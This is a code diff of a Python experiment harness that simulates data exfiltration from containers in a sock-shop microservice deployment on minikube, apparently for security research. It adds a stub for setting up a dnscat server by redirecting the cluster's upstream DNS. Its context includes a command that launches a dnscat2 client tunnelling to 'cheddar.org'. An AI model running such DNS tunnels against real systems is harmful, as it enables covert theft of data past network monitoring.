@@ -1091,6 +1091,12 @@ def setup_config_file_det_client(dst, container, directory_to_exfil, regex_to_ex
     #print next( file_to_exfil.output )
     return file_to_exfil
 
+def setup_dnscat_server():
+    ## TODO: definitely NOT going to be doing this manually...
+    # Step (1): install dnscat_server dependencies + start it (already have a script ready to go)
+    # Step (2): switch upstream DNS server of kubernetes deployment (to the dnscat server...)
+    pass
+
 def start_dnscat_client(container):
     cmds = ['/dnscat2/client/dnscat', 'cheddar.org']
     print "start dns exfil commands", str(cmds)
@@ -1340,7 +1346,6 @@ def setup_directories(exp_name):
     os.makedirs('./experimental_data/'+exp_name+'/debug')
     print "Just setup directories!"
 
-
 def get_ip_and_port(app_name):
     if app_name == 'sockshop':
         out = subprocess.check_output(['minikube', 'service', 'front-end',  '--url', '--namespace=sock-shop'])
@@ -1366,9 +1371,6 @@ if __name__=="__main__":
     parser.add_argument('--prepare_app_p', dest='prepare_app_p', action='store_true',
                         default=False,
                         help='sets up the application (i.e. loads db, etc.)')
-    parser.add_argument('--install_det_depen', dest='install_det_depen_p', action='store_true',
-                        default=False,
-                        help='install DET dependencies on the relevant containers?')
     parser.add_argument('--port',dest="port_number", default=None)
     parser.add_argument('--ip',dest="vm_ip", default=None)
     parser.add_argument('--docker_daemon_port',dest="docker_daemon_port", default='2376')
@@ -1382,7 +1384,7 @@ if __name__=="__main__":
     parser.add_argument('--localhostip',dest="localhostip", default="192.168.99.1")
 
     args = parser.parse_args()
-    print args.exp_name, args.config_file, args.prepare_app_p, args.port_number, args.vm_ip, args.localhostip, args.install_det_depen_p, args.exfil_p
+    print args.exp_name, args.config_file, args.prepare_app_p, args.port_number, args.vm_ip, args.localhostip, args.exfil_p
 
     print os.getcwd()
     with open(args.config_file) as f:
